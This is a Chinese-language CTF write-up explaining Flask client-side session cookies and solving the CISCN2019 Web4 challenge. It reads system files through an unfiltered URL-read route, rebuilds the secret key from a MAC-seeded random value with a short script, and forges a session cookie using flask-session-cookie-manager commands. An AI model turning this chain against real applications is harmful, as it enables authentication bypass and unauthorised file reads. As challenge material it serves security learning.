https://www.cnblogs.com/GTL-JU/p/16960460.html
## 0x01 session的作用

由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。  
用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息

## 0x02 flask session的储存方式

1. 直接存在客户端的cookies中

2. 存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库

flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。
## 0x03 flask的session格式

flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。

```python
eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0
session数据                                     时间戳       签名               
```

时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；

签名：是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。

注意到了最重要的签名部分其实只有`secret_key`部分是一个未知，也就是说我们只要拿到了`secret_key`，就能伪造任意内容的session了。

## 例题
###  CISCN2019 华东南赛区【Web4】
进去是一个链接，但是打不开了，（不知道为什么）但是查看源代码发现是传一个url参数，猜测是ssrf，尝试之后也没反应，也可能是文件包含，再试试，果然能读到
![600](assets/Day%203/file-20251220021309697.png)
抓包在读一下其他文件，同时也发现了存在特殊的cookie
![500](assets/Day%203/file-20251220021354705.png)
以为是jwt，尝试解码一下
![500](assets/Day%203/file-20251220021551745.png)
这看着也不是常规的jwt。这里我们也查到了当前进程存在的文件，所以直接看源码了
```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```
逻辑很简单
`/read`路由是一个urlopen输入的，这里可以理解为文件读取
`/flag`路由就是查看flag的，但是这里会检查我们的session，所以应该就是一个session伪造，刚好前两天面试也问到了flask的session，这里学习一下。
我们看到session生成规则：
```python
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True
```
这里是一个伪随机数，设置了种子的，还要了解一下`uuid.getnode()`
![](assets/Day%203/file-20251220022618712.png)
看到这里值是和mac地址有关，学了一下怎么获得mac地址
`/sys/class/net/eth0/address`
这是linux中存储mac地址的地方
![](assets/Day%203/file-20251220023000279.png)
了解了一下，flask的session是会和`secret_key`有关的，有了这个key就可以用工具直接伪造了。
这里我们直接按照逻辑得到`secret_key`
我们通过脚本可以得到mac对应的key
```python
import uuid
import random

mac = "2e:b0:8f:54:a6:f4"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*233)
print(randStr)
```
(注意这里还只有用python2跑脚本，不知道为什么，python3跑精度不一样)没有环境可以用在线网站跑
https://www.jyshare.com/compile/6/
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
{'username': b'www-data'}
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
```
我们这里需要`username=fuck`，用工具改一下：
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
```
然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
![500](assets/Day%203/file-20251220030430083.png)
